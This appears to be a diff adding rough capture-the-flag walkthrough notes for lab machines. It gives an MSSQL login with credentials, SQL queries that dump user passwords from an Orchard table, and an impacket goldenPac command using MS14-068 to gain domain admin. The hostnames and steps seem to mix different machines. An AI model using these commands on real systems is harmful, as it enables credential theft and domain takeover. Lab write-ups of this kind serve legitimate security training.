@@ -1,0 +1,19 @@
+we looked at all http but port 1337 had a directory which had creds
+
+with creds we logged in mssqlclient and got creds for james
+
+./mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
+
+```
+SELECT name FROM master.dbo.sysdatabases;
+USE orcharddb;
+SELECT Username, Password FROM blog_Orchard_Users_UserPartRecord;
+```
+
+we tried to log in with psexec winrm but cant log in
+
+```
+impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis' 
+```
+
+MS14-068 we got admin
